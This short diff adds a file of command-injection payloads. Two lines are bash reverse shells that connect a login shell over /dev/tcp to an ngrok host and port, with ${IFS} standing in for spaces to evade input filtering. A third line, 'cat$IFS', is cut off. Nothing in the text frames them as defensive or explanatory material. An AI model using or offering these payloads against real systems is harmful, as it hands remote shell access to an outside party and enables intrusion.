@@ -1,0 +1,5 @@
+bash${IFS}-l${IFS}>${IFS}/dev/tcp/0.tcp.ap.ngrok.io/13754${IFS}0<&1${IFS}2>&1
+
+bash$IFS-l$IFS>&$IFS/dev/tcp/0.tcp.ap.ngrok.io/13754$IFS0>&1
+
+cat$IFS
